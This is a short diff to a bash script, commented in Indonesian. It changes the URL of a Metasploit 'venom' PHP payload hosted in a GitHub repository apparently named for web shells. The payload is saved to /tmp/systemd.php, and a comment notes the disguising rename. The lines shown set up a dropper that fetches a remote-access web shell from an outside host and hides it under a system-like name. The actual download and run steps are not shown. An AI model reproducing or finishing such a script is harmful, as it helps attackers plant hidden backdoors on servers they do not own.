@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # URL payload
-PAYLOAD_URL="https://raw.githubusercontent.com/jabarzad/wshell/refs/heads/main/payload/msf/mod_venom.php"
+PAYLOAD_URL="https://raw.githubusercontent.com/jabarzad/wshell/refs/heads/main/payload/msf/venom.php"
 
 # Lokasi untuk menyimpan payload
 PAYLOAD_PATH="/tmp/systemd.php"  # Nama file diubah menjadi systemd.php
